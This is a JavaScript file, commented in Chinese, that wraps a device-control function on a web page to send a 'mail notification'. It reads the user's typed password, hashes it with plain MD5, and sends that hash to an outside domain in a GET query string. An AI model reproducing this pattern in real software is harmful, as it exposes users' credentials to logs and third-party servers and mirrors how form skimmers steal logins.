/**
 * 邮件通知服务
 * 用于向管理员发送设备操作通知
 */

// 邮件服务基础URL
const MAIL_BASE_URL = 'https://mail.datao2233.top';

/**
 * 发送设备操作邮件通知
 * 从页面获取用户输入的操作类型和密码，发送邮件请求
 */
function sendMailNotification() {
    try {
        // 获取用户输入的操作类型（从按钮的onclick参数中获取）
        const activeButton = document.querySelector('.controls button:disabled');
        if (!activeButton) return false;
        
        // 从onclick属性中提取action参数
        const onclickText = activeButton.getAttribute('onclick');
        const actionMatch = onclickText.match(/controlDevice\('([^']+)'\)/);
        if (!actionMatch) return false;
        
        const action = actionMatch[1];
        
        // 获取用户输入的密码
        const keyInput = document.getElementById('keyInput');
        const userKey = keyInput.value;
        if (!userKey) return false;
        
        // 对用户输入的key进行MD5加密
        const encryptedKey = md5(userKey);
        
        // 发送邮件请求，只包含action和key参数
        fetch(`${MAIL_BASE_URL}/?action=${action}&key=${encodeURIComponent(encryptedKey)}`, {
            method: 'GET'
        })
        .then(response => {
            if (response.ok) {
                console.log('邮件通知发送成功');
            } else {
                console.error('邮件服务器返回错误:', response.status);
            }
        })
        .catch(error => {
            console.error('发送邮件通知失败:', error);
        });
        
        return true;
    } catch (error) {
        console.error('发送邮件通知时发生错误:', error);
        return false;
    }
}

// 重写原controlDevice函数以包含邮件通知
const originalControlDevice = window.controlDevice;

window.controlDevice = function(action) {
    // 先执行原始的设备控制逻辑
    if (originalControlDevice) {
        originalControlDevice(action);
    }
    
    // 发送邮件通知
    setTimeout(() => {
        sendMailNotification();
    }, 100);
};

// 监听按钮点击事件，捕获action参数
document.addEventListener('DOMContentLoaded', function() {
    const controlButtons = document.querySelectorAll('.controls button');
    
    controlButtons.forEach(button => {
        button.addEventListener('click', function() {
            // 存储当前操作类型到data属性
            const onclickText = this.getAttribute('onclick');
            const actionMatch = onclickText.match(/controlDevice\('([^']+)'\)/);
            if (actionMatch) {
                this.setAttribute('data-action', actionMatch[1]);
            }
        });
    });
});